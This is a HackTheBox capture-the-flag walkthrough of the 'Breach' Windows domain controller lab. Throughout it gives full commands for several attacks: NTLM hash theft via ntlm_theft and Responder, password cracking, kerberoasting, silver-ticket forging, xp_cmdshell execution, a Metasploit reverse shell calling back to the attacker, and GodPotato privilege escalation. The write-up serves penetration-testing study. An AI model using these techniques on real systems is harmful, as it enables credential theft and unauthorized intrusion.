# [HackTheBox - Breach](https://app.hackthebox.com/machines/Breach)

![46ad3b94d4e0c8388c661813b8fb8691.png](/resources/46ad3b94d4e0c8388c661813b8fb8691.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Obtaining Julia.Wong credential with ntlm_theft](#obtaining-juliawong-credential-with-ntlm_theft)
- [Kerberoasting svc_mssql user](#kerberoasting-svc_mssql-user)
- [Silver Ticket to MSSQL](#silver-ticket-to-mssql)
- [Initial Access with xp_cmdshell for reverse shell](#initial-access-with-xp_cmdshell-for-reverse-shell)
- [Privilege Escalation via Potato (SeImpersonatePrivilege)](#privilege-escalation-via-potato-seimpersonateprivilege)

***
## Abstract
Breach is a vulnlab machine imported to HackTheBox as a medium Windows Active Directory box. I started with network enumeration with nmap, revealing this machine is a domain controller and also have MSSQL server running on it. 

Enumeration phase reveals guest user is enable and can be used to write a file created by ntlm_theft tool to steal credential of Juilia.Wong user, then using that valid credential of domain user to conduct kerberoasting attack on svc_mssql which is a service account of Microsoft SQL service.

To be able to use Microsoft SQL service as the administrator user, Silver ticket is required to enable xp_cmdshell and gaining a foothold on the machine.

We will foothold as svc_mssql service account which have SeAssignPrimaryTokenPrivilege and SeImpersonatePrivilege that can be leveraged with Potatos to get SYSTEM and root the box.  

## Enumeration
Run nmap with no flag to quickly skim opened well-known port which reveals that there is a website running on port 80
```
nmap $IP
```
![11fec01c57ae3d06db7c7a02d9276b1c.png](/resources/11fec01c57ae3d06db7c7a02d9276b1c.png)

I rerun nmap scan again but this time with `-sCV` flag for service enumeration and nmap script engine, which I discovered the hostname here and found that my initial nmap scan missed MSSQL port, and beside that we can also see that the port 80 is just hosting basic IIS landing page.

![9ba38760f500f464525bbc4e5147ab5a.png](/resources/9ba38760f500f464525bbc4e5147ab5a.png)

Since this is the domain controller, I start by enumerating SMB and LDAP next with null session and guest user which I found that null session can not be used here but the guest user is enabled and can use to enum and we can see that we can read and write on `share` folder
```
nxc smb breach.vl -u 'guest' -p '' --shares
```
![26c291257a1b3db1d954abe231f71b0c.png](/resources/26c291257a1b3db1d954abe231f71b0c.png)

On the `share` share, I found 3 folders here.
```
smbclient \\\\breach.vl\\share -N
```
![86a29f1971ef0c0d85967cc80cb0cec3.png](/resources/86a29f1971ef0c0d85967cc80cb0cec3.png)

I found 3 users from `transfer` folder so at least we know that these 3 users are the active user on this machine.

![828d9d8d2028bbfa3ad8dc8d67e10282.png](/resources/828d9d8d2028bbfa3ad8dc8d67e10282.png)

Nothing really impressed on Users share

![efaf51a807fc8d8bc7c0cf8bcc399fc7.png](/resources/efaf51a807fc8d8bc7c0cf8bcc399fc7.png)

I use RID cycling method to see if i can pull user list on this domain and sure enough, I can since I can use guest account to access SMB share so RPC can be used for this method.

![3c21d9374d898d65294470d1cd9df20b.png](/resources/3c21d9374d898d65294470d1cd9df20b.png)

## Obtaining Julia.Wong credential with ntlm_theft

Since guest account have write permission on the `share` share so I will use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) to create files for NTLMv2 callback/NTLMSSP authentication.
```
python ntlm_theft.py -s 10.10.14.24 -f newpolicy -g all
```
![b609212f9c4546066d986d37c22a8f35.png](/resources/b609212f9c4546066d986d37c22a8f35.png)

Then I upload it to `transfer` folder.

![962b2e25da423b54cadf3a6237d3e481.png](/resources/962b2e25da423b54cadf3a6237d3e481.png)

As soon as I use `responder` to setup the listener for NTLMSSP, I got NTLMv2 hash of Julia.Wong right away.
```
sudo responder -I tun0
```
![666c98564180851e5319ba258681e53b.png](/resources/666c98564180851e5319ba258681e53b.png)

Using John The Ripper, I easily cracked the password of this user in a very short amount of time which mean this is the intended way to solve the box.
```
john --wordlist=/usr/share/wordlists/rockyou.txt julia
```
![72f930efe8fa0d94c2605802c34cab61.png](/resources/72f930efe8fa0d94c2605802c34cab61.png)

Since MSSQL is running on port 1433 so I use try to authenticate to MSSQL using NetExec which we can see that the Julia.Wong user can access MSSQL service.
```
nxc mssql breach.vl -u 'Julia.Wong' -p 'Computer1'
```
![ac84f25c62c50d31ca40467794dab8c7.png](/resources/ac84f25c62c50d31ca40467794dab8c7.png)

I ran an SQL query to confirm gain if this user can really execute SQL query in MSSQL which we can see that there is no problem running this SQL query here and there is no any database that standout as well.
```
nxc mssql breach.vl -u 'Julia.Wong' -p 'Computer1' -q 'SELECT name FROM master.dbo.sysdatabases;'
```
![a8f33c50d81ffad4a3c3edbea6cbccc7.png](/resources/a8f33c50d81ffad4a3c3edbea6cbccc7.png)

Next I use impacket mssqlclient to interact with MSSQL but as we can see that this user only have "guest" access to MSSQL here so I will not be able to enable xp_cmdshell for the foothold from this user.
```
impacket-mssqlclient 'Julia.Wong:Computer1@breach.vl' -windows-auth
```
![e18955eae723336b4e0e233acc0d2aba.png](/resources/e18955eae723336b4e0e233acc0d2aba.png)

## Kerberoasting svc_mssql user

Since I already obtained valid domain user credential then I can leverage that to conduct kerberoasting attack which reveals that we can get the hash of "svc_mssql" service user here.
```
nxc ldap breach.vl -u 'Julia.Wong' -p 'Computer1' --kerberoast roast.txt
```
![87782a67c93efcfe41045323bf959f1b.png](/resources/87782a67c93efcfe41045323bf959f1b.png)

Cracking it with john the ripper then we should be able to have the password of this user and getting access to mssql in this user context.
```
john --wordlist=/usr/share/wordlists/rockyou.txt roast.txt
```
![50225f1e29b4d4660128d544be720432.png](/resources/50225f1e29b4d4660128d544be720432.png)

But after turn out, this user still have "guest" access on the MSSQL service so what should I do next?

![cdae923635bff44a6effc8c5e0379a09.png](/resources/cdae923635bff44a6effc8c5e0379a09.png)

## Silver Ticket to MSSQL
The answer of simple, since we already obtained the valid credential for MSSQL service user then we should be able to create a silver ticket (TGS of any user) for MSSQL service so in theory, if I have all the requirements fulfiled then I can generate TGS of Administrator user to authenticate to MSSQL service and enable xp_cmdshell for a foothold. 

And to be able to create a silver ticket with impacket-ticketer, I need 
- NT hash of the service account (I can easily convert plaintext password to NT hash with online resource or python)
- Domain SID
- SPN of the service account
- Target user and its RID (definitely will be an Administrator account with has RID of 500)

So what left for me is Domain SID and SPN of the service account.

First, I will sync my time with the domain controller first which I can collect domain information with bloodhound-python without any error.
```
sudo ntpdate 10.129.230.95
bloodhound-python -u 'Julia.Wong' -p 'Computer1' -d breach.vl -c all -ns 10.129.230.95 --zip
```
![901f12098260ecb62ae83b8f4b645db9.png](/resources/901f12098260ecb62ae83b8f4b645db9.png)

The service account’s SPN can be retrieved from BloodHound; however, our silver ticket is unusable because the SPN does not match the legitimate value (Already tried). So I will need another method to get the service SPN here. (and that's method is using `impacket-GetUserSPNs` for kerberoasting attack and the SPN that was displayed is the one that can be used to create silver ticket.)

![1104efef1e75ddbd5de9179789677a1e.png](/resources/1104efef1e75ddbd5de9179789677a1e.png)

Interestingly, there is one more user in the Administrators group which is Christine.bruce here.

![1ddd64e05c82687120b2059ffa02deaa.png](/resources/1ddd64e05c82687120b2059ffa02deaa.png)

Lastly, I grab the domain SID here and we will have all requirements for the silver ticket forging.

![2c5c37affd3ee0c052b8adf53e9fc5c0.png](/resources/2c5c37affd3ee0c052b8adf53e9fc5c0.png)

I use impacket-ticketer to create a silver ticket for Administrator account and then use it to authenticate to MSSQL and now I have accessed to MSSQL user as database owner (dbo).
```
impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' Administrator -user-id 500
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass Administrator@breach.vl -windows-auth
```
![834fa714ff7aa893ab3f194342a5d033.png](/resources/834fa714ff7aa893ab3f194342a5d033.png)

## Initial Access with xp_cmdshell for reverse shell

This user can enable `xp_cmdshell` so I use this simple command to enable it and now I should be able to run any command on this domain controller via MSSQL.
```
enable_xp_cmdshell
```
![02a3882f06ea1f841c4926df5cd0ecaf.png](/resources/02a3882f06ea1f841c4926df5cd0ecaf.png)

I will create a powershell reverse shell payload with web delivery module from metasploit framework.
```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lport 443
set lhost tun0
run
```
![2879d62eae81e069f0180a8e6cf245de.png](/resources/2879d62eae81e069f0180a8e6cf245de.png)

I simply parse the command like this and now I have shell as "svc_mssql" user on this machine and it even has SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege which can be exploited with Potato and get a SYSTEM shell.
```
xp_cmdshell powershell.exe...<SNIP>
```
![46c1b630b0d9683ac133c0dfd4b07011.png](/resources/46c1b630b0d9683ac133c0dfd4b07011.png)

![3a4d07b4a7b121e5acdd46187e63b2de.png](/resources/3a4d07b4a7b121e5acdd46187e63b2de.png)

## Privilege Escalation via Potato (SeImpersonatePrivilege)

Normally when I have SeImpersonatePrivilege on meterpreter, I can use `getsystem` to get a SYSTEM shell easily but it could not be used on this box since all pipe instance are busy as shown in the image below. 

![77a535aab32f0493ea4db3442751d9a0.png](/resources/77a535aab32f0493ea4db3442751d9a0.png)

So I will use [GodPotato](https://github.com/BeichenDream/GodPotato) instead which I upload it to music folder of public user.

![312e02a0207b917ccf992905e054a0c9.png](/resources/312e02a0207b917ccf992905e054a0c9.png)

I test with a simply whoami command first to see if GodPotato can really be used and we can see that it being ran as NT AUTHORITY\SYSTEM so this should not be a problem to get SYSTEM shell now.
```
GodPotato-NET4.exe -cmd "cmd /c whoami"
```
![7c037362d6d4f9d627f1364a46026b62.png](/resources/7c037362d6d4f9d627f1364a46026b62.png)

I use the same payload used in `xp_cmdshell` to get a reverse shell in metasploit and now I can loot both user and root flag to root the box :D
```
GodPotato-NET4.exe -cmd "powershell.exe...<SNIP>""
```
![e8f1424d867f34a80822110d2f20e8ba.png](/resources/e8f1424d867f34a80822110d2f20e8ba.png)

User flag

![b5a030b37c82ac7e211d6f9f22101fb7.png](/resources/b5a030b37c82ac7e211d6f9f22101fb7.png)

Root flag

![3499ce5087a7afe7f136140f0ed37709.png](/resources/3499ce5087a7afe7f136140f0ed37709.png)

![b9a2f9a205825c67f52d1ea064f305ae.png](/resources/b9a2f9a205825c67f52d1ea064f305ae.png)

https://labs.hackthebox.com/achievement/machine/1438364/766
***